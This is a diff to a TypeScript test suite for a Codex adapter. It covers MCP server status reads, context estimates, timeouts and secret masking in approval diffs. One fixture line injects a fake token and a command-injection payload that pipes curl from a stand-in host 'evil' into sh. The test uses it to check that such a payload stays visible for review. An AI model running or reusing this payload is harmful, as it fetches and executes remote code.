@@ -5,6 +5,8 @@
  * wire params, the FR-087 refusals, crash, stop, fixtures, and the approval/interrupt wiring.
  */
 import * as assert from 'assert';
+import { McpContextTracker } from '../src/main/mcpcontextop';
+import { estimateTools } from '../src/shared/mcpcost';
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
@@ -17,13 +19,14 @@ import type { AgentEvent, PermissionMode } from '../src/adapters/types';
 import { eventProblems } from '../src/adapters/eventguard';
 import { FakeCodexServer, fakePid } from './fakes/codex-app-server';
 import type { FakeCodexOptions } from './fakes/codex-app-server';
+import { tmpDir } from './test-tmp';
 
 const BIN = path.join(os.tmpdir(), 'fake-codex-bin');
 /** FR-087: a refusal never offers the widest mode as the way out. */
 const noFallback = (e: Error): boolean => !/Allow all/i.test(e.message);
 const tmp: string[] = [];
 const dir = (): string => {
-  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'durbar-codex-'));
+  const d = tmpDir('durbar-codex-');
   tmp.push(d);
   return d;
 };
@@ -96,7 +99,8 @@ async function main(): Promise<void> {
       interrupt: true, resume: true, images: true, models: true, planMode: true, effort: true, modelSwitch: { verified: true, contextTier: false },
       autopilot: { capUnit: 'tokens', attachments: false, planApproval: false, verified: false }, // spec 099 T021
       permissionModes: ['read-only', 'ask', 'allow'], permModeSwitch: 'next-message',
-      usage: { tokens: true, costUsd: false, nanoAiu: false }, context: true, caps: false, helpers: true, history: true, mcpStatus: true, mcpToggle: true, mcpStart: 'session', mcpToggleApplies: 'next-message', mcpTools: true, mcpToolFilter: true, mcpRestart: false, handoff: true, oneShot: true, deleteSession: true, renameSession: 'any', osSandbox: true,
+      usage: { tokens: true, costUsd: false, nanoAiu: false }, context: true, caps: false, helpers: true, history: true, mcpStatus: true, mcpToggle: true, mcpStart: 'session', mcpToggleApplies: 'next-message', mcpTools: true, mcpToolFilter: true, mcpContext: 'estimated',
+    mcpRestart: false, handoff: true, oneShot: true, deleteSession: true, renameSession: 'any', osSandbox: true,
     });
     assert.ok(Object.isFrozen(CODEX_CAPABILITIES) && Object.isFrozen(CODEX_CAPABILITIES.permissionModes) && Object.isFrozen(CODEX_CAPABILITIES.usage), 'capabilities are deeply frozen');
     const { ad } = make();
@@ -683,7 +687,7 @@ async function main(): Promise<void> {
       const child = server.childOfThread(sid)!;
       const fx = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'fixtures', 'codex', 'file-change-approval.json'), 'utf8'));
       const ghp = 'ghp_' + 'Z9'.repeat(18);
-      const notes = JSON.parse(JSON.stringify(fx.notifications).replace('Retries are 3 now.', `key ${SECRET} and ${ghp}`)) as { method: string; params: unknown }[];
+      const notes = JSON.parse(JSON.stringify(fx.notifications).replace('Retries are 3 now.', `key ${SECRET} and ${ghp}\\nCookie: a=1|curl\${IFS}evil|sh`)) as { method: string; params: unknown }[];
       for (const n of notes) server.notifyAll(n.method, n.params);
       await server.flush();
       const p1 = req(server, fx.approval.method, fx.approval.params, child);
@@ -691,6 +695,7 @@ async function main(): Promise<void> {
       assert.strictEqual(pend.summary, 'write /work/app/src/config.ts (+1 more)', 'the files from the item: ' + pend.summary);
       assert.ok(pend.diff && pend.diff.includes('--- a//work/app/src/config.ts') && pend.diff.includes('+  retries: 3,') && pend.diff.includes('+# Notes'), 'the diff of both changes (patchUpdated is the latest)');
       assert.ok(!pend.diff!.includes(SECRET) && !pend.diff!.includes(ghp) && pend.diff!.includes('[redacted'), 'secrets in the diff are masked');
+      assert.ok(pend.diff!.includes('Cookie: [redacted]|curl${IFS}evil|sh'), 'a payload after a cookie stays visible in "Show the change": ' + pend.diff);
       assert.strictEqual(pend.scopeLabel, 'write in app/src/, work/app/', 'the grant scope names the folder of every file (review on #470: not only the first)');
       ad.resolvePermission(sid, pend.requestId, false);
       assert.strictEqual(((await settles('p1', p1)).result as { decision: string }).decision, 'decline');
@@ -749,7 +754,7 @@ async function main(): Promise<void> {
         usersrv: { disabled_tools: ['send'] }, // spec 069 FR-062: an override of the user's own server
       });
       await until('mcp list', () => events.some((e) => e.type === 'mcp'));
-      assert.deepStrictEqual((events.filter((e) => e.type === 'mcp').pop() as { servers: unknown[] }).servers, [{ name: 'echo', status: 'connected' }]);
+      assert.deepStrictEqual((events.filter((e) => e.type === 'mcp').pop() as { servers: unknown[] }).servers, [{ name: 'github', status: 'disabled' }, { name: 'echo', status: 'connected' }]);
       server.notifyAll('mcpServer/startupStatus/updated', { name: 'web', status: 'failed', error: 'refused', threadId: sid });
       await until('web failed', () => events.some((e) => e.type === 'mcp' && (e as { servers: Array<{ name: string; status: string }> }).servers.some((s) => s.name === 'web' && s.status === 'failed')));
       // spec 069 FR-031: one server's tools from mcpServerStatus/list on the thread's connection (the tools map of the generated schema)
@@ -759,24 +764,74 @@ async function main(): Promise<void> {
       await assert.rejects(ad.listMcpTools!(sid, 'broken'), /spawn broken-mcp ENOENT/, 'toolsError is the failure');
       await assert.rejects(ad.listMcpTools!(sid, 'nope'), /not running in this session/);
       await assert.rejects(ad.listMcpTools!('no-such', 'echo'), /not running/);
-      // review on #499: a Codex that ignores serverName and pages 10 at a time: the 23rd server is found on page 3
+      // FR-164 (was: follow the pages of a Codex that ignores serverName): one request, never more; a server not on the page is not found
       server.mcpList = Array.from({ length: 25 }, (_v, i) => ({ name: `srv-${i}`, authStatus: 'unsupported', runtimeStatus: 'connected', tools: { [`t${i}`]: { name: `t${i}`, inputSchema: {} } }, resources: [], resourceTemplates: [] }));
       server.mcpPageSize = 10;
       server.mcpIgnoreServerName = true;
       const before = server.requests('mcpServerStatus/list').length;
-      assert.deepStrictEqual(await ad.listMcpTools!(sid, 'srv-22'), [{ name: 't22' }]);
-      assert.strictEqual(server.requests('mcpServerStatus/list').length - before, 3, 'three pages asked');
-      assert.strictEqual((server.requests('mcpServerStatus/list').pop()!.params as Record<string, unknown>).cursor, '20');
-      await assert.rejects(ad.listMcpTools!(sid, 'srv-99'), /not running in this session/, 'not on any page');
-      // re-review on #499: a pager that always answers the same nextCursor: the second request repeats it, so the search stops there
-      server.mcpStuckCursor = 'same';
-      const stuck = server.requests('mcpServerStatus/list').length;
-      await assert.rejects(ad.listMcpTools!(sid, 'srv-99'), /not running in this session/, 'a repeated cursor ends the search');
-      assert.strictEqual(server.requests('mcpServerStatus/list').length - stuck, 2, 'two requests, then stop on the repeated cursor');
-      server.mcpStuckCursor = undefined;
-      server.mcpList = undefined;
+      await assert.rejects(ad.listMcpTools!(sid, 'srv-22'), /not running in this session/);
+      assert.strictEqual(server.requests('mcpServerStatus/list').length - before, 1, 'one request, no paging (a bare list may start servers)');
       server.mcpPageSize = undefined;
       server.mcpIgnoreServerName = false;
+      // spec 100 T014: every server's schemas, estimated; the schemas go no further than the call; a failed list is partial
+      {
+        const SECRET_DESC = 'A description that must not stay anywhere';
+        server.mcpList = [
+          { name: 'big', authStatus: 'unsupported', runtimeStatus: 'connected', tools: { read: { name: 'read', description: SECRET_DESC, inputSchema: { type: 'object' } } } },
+          { name: 'down', authStatus: 'unsupported', runtimeStatus: 'failed', tools: {}, toolsError: 'tools/list failed: token=abc123 refused' },
+        ];
+        for (const n of ['big', 'down']) server.notifyAll('mcpServer/startupStatus/updated', { name: n, status: 'ready', threadId: sid }); // FR-164: the names come from the thread
+        await until('names known', () => ((events.filter((e) => e.type === 'mcp').pop() as { servers: Array<{ name: string }> } | undefined)?.servers.some((x) => x.name === 'down')) || undefined);
+        const rep = await ad.mcpContext!(sid);
+        const want = estimateTools({ read: { name: 'read', description: SECRET_DESC, inputSchema: { type: 'object' } } }).tokens;
+        assert.deepStrictEqual(rep, { servers: [{ name: 'big', tokens: want, tools: 1, source: 'estimated' }, { name: 'down', source: 'unknown', error: 'list failed' }], partial: true }, 'both servers read');
+        const text = JSON.stringify(rep);
+        assert.ok(!text.includes(SECRET_DESC) && !text.includes('inputSchema') && !text.includes('abc123'), 'no schema, description or app text in the report (FR-004, FR-040)');
+        const req = server.requests('mcpServerStatus/list').find((r) => (r.params as { serverName?: string }).serverName === 'down')!.params as Record<string, unknown>;
+        assert.deepStrictEqual([req.threadId, req.serverName, req.detail], [sid, 'down', 'toolsAndAuthOnly'], 'the spec 069 call, one server at a time (FR-164)');
+        assert.strictEqual(ad.capabilities.mcpContext, 'estimated');
+        // one read at a time, and one limit over all its reads: a second ask joins it, none starts beside it
+        {
+          const before = server.requests('mcpServerStatus/list').length;
+          server.holdMcpList = true;
+          const first = ad.mcpContext!(sid), second = ad.mcpContext!(sid);
+          await new Promise((r) => setImmediate(r));
+          await server.flush();
+          assert.strictEqual(server.requests('mcpServerStatus/list').length, before + 1, 'one request, however many asks');
+          (ad as unknown as { mcpContextLimitMs: number }).mcpContextLimitMs = 30;
+          server.holdMcpList = false;
+          server.releaseMcpList();
+          assert.deepStrictEqual(await second, await first, 'the same read');
+          server.holdMcpList = true;
+          const hung = ad.mcpContext!(sid);
+          assert.deepStrictEqual(await hung, { servers: [], failed: true }, 'the limit ends a read that hangs: a failed read');
+          assert.ok(!(ad as unknown as { mcpContextReads: Map<string, unknown> }).mcpContextReads.has(sid), 'and a later ask may start');
+          server.holdMcpList = false;
+          server.releaseMcpList();
+          // a later server that hangs: the limit gives up with nothing, not with the first server's part
+          const partly = await (ad as unknown as { readMcpContext(l: unknown, n: string[]): Promise<unknown> }).readMcpContext({ threadId: 't', rpc: { request: async (_m: string, p: { serverName?: string }) => (p.serverName === 'b' ? new Promise(() => undefined) : { data: [{ name: 'a', tools: { x: { name: 'x' } } }] }) } }, ['a', 'b']);
+          assert.deepStrictEqual(partly, { servers: [], failed: true }, 'no figure from part of the list');
+          // finding 1, through the tracker: a read over the limit after figures keeps them
+          {
+            let now = 0;
+            const t = new McpContextTracker({ agents: new Map([[sid, { id: sid } as never]]), router: { forAgent: () => ad } as never, secrets: () => [], live: () => [], off: () => new Set(), push: () => undefined, now: () => now });
+            server.holdMcpList = false;
+            server.releaseMcpList();
+            await server.flush();
+            const first2 = await t.get(sid, true);
+            assert.ok((first2.report?.servers.length ?? 0) > 0, 'figures first');
+            server.holdMcpList = true;
+            now += 61_000;
+            assert.deepStrictEqual((await t.get(sid, true)).report, first2.report, 'the last figures stay');
+            server.holdMcpList = false;
+            server.releaseMcpList();
+            await server.flush();
+          }
+          (ad as unknown as { mcpContextLimitMs: number }).mcpContextLimitMs = 10_000;
+        }
+        assert.deepStrictEqual(await ad.mcpContext!('no-such'), { servers: [], failed: true });
+        server.mcpList = undefined;
+      }
       await ad.setMcpEnabled!(sid, 'echo', false);
       const last = events.filter((e) => e.type === 'mcp').pop() as { servers: Array<{ name: string; status: string }> };
       assert.strictEqual(last.servers.find((s) => s.name === 'echo')?.status, 'disabled', 'shown as off at once');
@@ -799,6 +854,7 @@ async function main(): Promise<void> {
         { name: 'c', authStatus: 'oAuth', runtimeStatus: 'failed' },
         { name: 'd', authStatus: 'oAuth', runtimeStatus: 'connected' },
       ];
+      server.configMcpNames = ['a', 'b', 'c', 'd']; // the user's own servers (config.toml), none sent by Durbar: FR-164 gets their names from config/read
       const sid = await ad.start({ workspace: ws, permissionMode: 'read-only' });
       await until('mcp list', () => (events.some((e) => e.type === 'mcp')) || undefined);
       assert.deepStrictEqual(lastMcp(), [
@@ -857,11 +913,12 @@ async function main(): Promise<void> {
       for (const id of ['m7', 'm8', 'm9']) server.notifyAll('item/completed', { threadId: sid, item: item(id, { server: 'd', error: { message: 'MCP OAuth challenge required (HTTP 401)' } }) });
       await until('m9', () => (events.some((e) => e.type === 'toolCall' && e.callId === 'm9')) || undefined);
       await new Promise((r) => setTimeout(r, 50));
-      assert.strictEqual(reads() - n1, 1, 'three challenges, one list request while it is pending');
+      assert.strictEqual(reads() - n1, 1, 'three challenges, one list request while it is pending (the first server of one read)');
       server.releaseMcpList();
       await new Promise((r) => setTimeout(r, 50));
+      const n1b = reads();
       server.notifyAll('item/completed', { threadId: sid, item: item('m10', { server: 'd', error: { message: 'MCP OAuth challenge required (HTTP 401)' } }) });
-      await until('read again after it settled', () => (reads() - n1 >= 2) || undefined);
+      await until('read again after it settled', () => (reads() - n1b >= 4) || undefined); // FR-164: one request per server (a, b, c, d)
       // switching the server off and on drops the challenge mark: a later re-read that lists it connected shows it connected
       assert.strictEqual(lastMcp().find((s) => s.name === 'd')?.status, 'needs-auth', 'marked before the switch');
       await ad.setMcpEnabled!(sid, 'd', false);
@@ -1300,6 +1357,155 @@ async function main(): Promise<void> {
       // FR-147: the adapter itself turns mcpServer/startupStatus/updated into `mcp` events; the mapper fixtures do not cover them
       assert.deepStrictEqual(got.slice(1).filter((e) => (e as { type: string }).type !== 'mcp'), want, `${f}: adapter events equal the fixture's expected list`);
       await ad.dispose();
+    }
+  }
+
+  // ---- spec 012 FR-164 (issue #1077): no status read lists without `serverName` (Codex 0.163.0 starts a copy of every local server for it)
+  {
+    type Row = { name: string; status: string; errorClass?: string };
+    const item = (name: string, over: Record<string, unknown> = {}): unknown => ({ name, authStatus: 'unsupported', runtimeStatus: 'connected', tools: { t: { name: 't', inputSchema: {} } }, resources: [], resourceTemplates: [], ...over });
+    const lists = (server: FakeCodexServer): Array<Record<string, unknown>> => server.requests('mcpServerStatus/list').map((r) => r.params as Record<string, unknown>);
+    const bare = (server: FakeCodexServer): number => lists(server).filter((p) => typeof p.serverName !== 'string').length;
+    const asked = (server: FakeCodexServer, n: string): number => lists(server).filter((p) => p.serverName === n).length;
+    const lastOf = (events: Array<{ type: string }>): Row[] => (events.filter((e) => e.type === 'mcp').pop() as { servers: Row[] } | undefined)?.servers ?? [];
+    const mcpEvents = (events: Array<{ type: string }>): number => events.filter((e) => e.type === 'mcp').length;
+    const challenge = (server: FakeCodexServer, sid: string, id: string, srv: string): void => server.notifyAll('item/completed', { threadId: sid, item: { id, type: 'mcpToolCall', server: srv, tool: 't', status: 'failed', arguments: {}, error: { message: 'MCP OAuth challenge required (HTTP 401)' } } });
+    const sent = { d1: { type: 'stdio' as const, command: 'node' }, 'bad name': { type: 'stdio' as const, command: 'node' } };
+
+    // 1. a loud start with a user server Durbar never sent (config.toml): its sign-in state comes from its own list item (FR-060), by name
+    {
+      const { server, ad, events } = make();
+      server.configMcpNames = ['u1', 'u_off'];
+      server.mcpList = [item('d1'), item('u1', { authStatus: 'notLoggedIn' }), item('u_off', { runtimeStatus: 'disabled' })];
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only', mcpServers: sent, disabledMcpServers: ['u_off'] });
+      await until('start list', () => (mcpEvents(events) > 0) || undefined);
+      const got = Object.fromEntries(lastOf(events).map((r) => [r.name, r.status]));
+      assert.deepStrictEqual(got, { u_off: 'disabled', d1: 'connected', u1: 'needs-auth' }, 'the user server (notLoggedIn) reads needs-auth; the one switched off reads disabled');
+      assert.strictEqual(bare(server), 0, 'start: every list names a server');
+      assert.strictEqual(asked(server, 'u_off'), 0, 'a server switched off is not asked about');
+      assert.strictEqual(asked(server, 'bad name'), 0, 'a name Codex was never sent is not asked about (the codexMcpConfig filter)');
+      // 2. the context figures and one server's tools: by name, and not for a server switched off (kills the disabled filter)
+      const before = lists(server).length;
+      assert.deepStrictEqual((await ad.mcpContext!(sid)).servers.map((x) => x.name).sort(), ['d1', 'u1']);
+      assert.ok(lists(server).slice(before).every((p) => typeof p.serverName === 'string' && p.serverName !== 'u_off'), 'context: by name, none for the one switched off');
+      assert.strictEqual((await ad.listMcpTools!(sid, 'u1')).length, 1);
+      // 3. a switch of the user server that is off, then the next message (a fresh child): its row stays, so it can be switched back on
+      await ad.setMcpEnabled!(sid, 'u1', false);
+      await ad.send(sid, { text: 'next' });
+      await server.flush();
+      await settle(80);
+      const after = Object.fromEntries(lastOf(events).map((r) => [r.name, r.status]));
+      assert.deepStrictEqual(after, { u_off: 'disabled', d1: 'connected', u1: 'disabled' }, 'switched-off user servers keep their rows after a switch');
+      assert.strictEqual(bare(server), 0, 'no path listed without serverName');
+      await ad.dispose();
+    }
+    // 4. nothing is known: nothing is asked about but codex_apps, nothing is said; a name announced later is read by name (needs-auth shows)
+    {
+      const { server, ad, events } = make();
+      server.mcpList = [item('late', { authStatus: 'notLoggedIn' })];
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only' });
+      await server.flush();
+      await settle(60);
+      assert.strictEqual(mcpEvents(events), 0, 'no server known: no mcp event (kills dropping the empty return)');
+      assert.deepStrictEqual(lists(server).map((p) => p.serverName), ['codex_apps']);
+      server.notifyAll('mcpServer/startupStatus/updated', { name: 'late', status: 'ready', threadId: sid });
+      await until('late read', () => (lastOf(events).some((r) => r.name === 'late' && r.status === 'needs-auth')) || undefined);
+      assert.strictEqual(bare(server), 0);
+      // a name over 64 characters is not tracked (a cut name could never be read back)
+      const n0 = lists(server).length;
+      server.notifyAll('mcpServer/startupStatus/updated', { name: 'x'.repeat(70), status: 'ready', threadId: sid });
+      await settle(60);
+      assert.strictEqual(lists(server).length, n0, 'a name over 64 characters is not read');
+      await ad.dispose();
+    }
+    // 5. announced, then gone (Paco's review): a name Codex no longer lists and Durbar did not send leaves no row; one Durbar sent keeps its row
+    {
+      const { server, ad, events } = make();
+      server.mcpList = [item('d1'), item('ghost')];
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only', mcpServers: { d1: sent.d1, web: { type: 'stdio', command: 'node' } } });
+      server.notifyAll('mcpServer/startupStatus/updated', { name: 'ghost', status: 'ready', threadId: sid });
+      server.notifyAll('mcpServer/startupStatus/updated', { name: 'web', status: 'failed', error: 'refused', threadId: sid });
+      await until('ghost shown', () => (lastOf(events).some((r) => r.name === 'ghost')) || undefined);
+      await settle(60);
+      server.mcpList = [item('d1')]; // ghost is gone from the config
+      challenge(server, sid, 'g1', 'd1');
+      await until('ghost dropped', () => (!lastOf(events).some((r) => r.name === 'ghost')) || undefined);
+      const names = lastOf(events).map((r) => r.name).sort();
+      assert.deepStrictEqual(names, ['d1', 'web'], 'web (sent by Durbar, announced failed, not listed) keeps its row (kills replace-instead-of-merge)');
+      assert.strictEqual(lastOf(events).find((r) => r.name === 'web')?.status, 'failed');
+      await ad.dispose();
+    }
+    // 6. a switch made while a read is pending counts (the off list is read after the reads): u1 was read, then switched off, while codex_apps is pending
+    {
+      const { server, ad, events } = make();
+      server.configMcpNames = ['u1'];
+      server.mcpList = [item('d1'), item('u1')];
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only', mcpServers: { d1: sent.d1 } });
+      await until('first list', () => (lastOf(events).length === 2) || undefined);
+      await settle(60);
+      server.mcpHoldName = 'codex_apps'; // the last name
+      challenge(server, sid, 'c1', 'd1');
+      await until('read pending', () => (server.heldMcpListCount() > 0) || undefined);
+      await ad.setMcpEnabled!(sid, 'u1', false);
+      server.releaseMcpList();
+      await settle(100);
+      assert.strictEqual(lastOf(events).find((r) => r.name === 'u1')?.status, 'disabled', 'switched off during the read: still off');
+      await ad.dispose();
+    }
+    // 6b. names not known in time (config/read never answers): the read ends at the limit and the first message reads again
+    {
+      const { server, ad } = make();
+      server.mcpList = [item('d1')];
+      server.configReadNever = true;
+      (ad as unknown as { mcpContextLimitMs: number }).mcpContextLimitMs = 40;
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only', mcpServers: { d1: sent.d1 } });
+      await settle(150);
+      assert.strictEqual(lists(server).length, 0, 'no name known in time: nothing asked');
+      server.configReadNever = false;
+      (ad as unknown as { mcpContextLimitMs: number }).mcpContextLimitMs = 10_000;
+      await ad.send(sid, { text: 'hi' });
+      await until('first message reads', () => (asked(server, 'd1') > 0) || undefined);
+      await ad.dispose();
+    }
+    // 7. one failing server leaves the list as it was (the whole read is abandoned); a server that never answers is ended by the time limit
+    {
+      const { server, ad, events } = make();
+      server.configMcpNames = ['u1'];
+      server.mcpList = [item('d1'), item('u1')];
+      const sid = await ad.start({ workspace: dir(), permissionMode: 'read-only', mcpServers: { d1: sent.d1 } });
+      await until('first list', () => (lastOf(events).length === 2) || undefined);
+      await settle(60);
+      const n = mcpEvents(events);
+      server.mcpList = [item('d1', { runtimeStatus: 'failed' }), item('u1')]; // d1 is read first and changed; u1 fails after it
+      server.mcpFailFor = 'u1';
+      challenge(server, sid, 'f1', 'd1');
+      await until('failed read asked', () => (asked(server, 'u1') >= 2) || undefined);
+      await settle(60);
+      assert.ok(!lastOf(events).some((r) => r.name === 'd1' && r.status === 'failed'), 'a failure in the second server leaves the first as it was (no partial update)');
+      server.mcpFailFor = undefined;
+      (ad as unknown as { mcpContextLimitMs: number }).mcpContextLimitMs = 40;
+      server.mcpNeverFor = 'u1';
+      challenge(server, sid, 'f2', 'd1');
+      await settle(200);
+      assert.ok(!lastOf(events).some((r) => r.name === 'd1' && r.status === 'failed'), 'a hung server: the limit ends the read, the list stays');
+      server.mcpNeverFor = undefined;
+      server.mcpList = [item('d1', { runtimeStatus: 'failed' }), item('u1')];
+      challenge(server, sid, 'f3', 'd1');
+      await until('a later read starts and lands (mcpRefreshing was freed)', () => (lastOf(events).some((r) => r.name === 'd1' && r.status === 'failed')) || undefined);
+      assert.ok(mcpEvents(events) > n);
+      await ad.dispose();
+    }
+    // 8. a quiet start reads nothing until the first message, then by name
+    {
+      const q = make();
+      q.server.mcpList = [item('d1')];
+      const qs = await q.ad.start({ workspace: dir(), permissionMode: 'read-only', quiet: true, mcpServers: sent });
+      await q.server.flush();
+      assert.strictEqual(lists(q.server).length, 0, 'a quiet start reads nothing');
+      await q.ad.send(qs, { text: 'hi' });
+      await until('first message list', () => (mcpEvents(q.events) > 0) || undefined);
+      assert.ok(lists(q.server).length > 0 && bare(q.server) === 0, 'first message: every list names a server');
+      await q.ad.dispose();
     }
   }
 
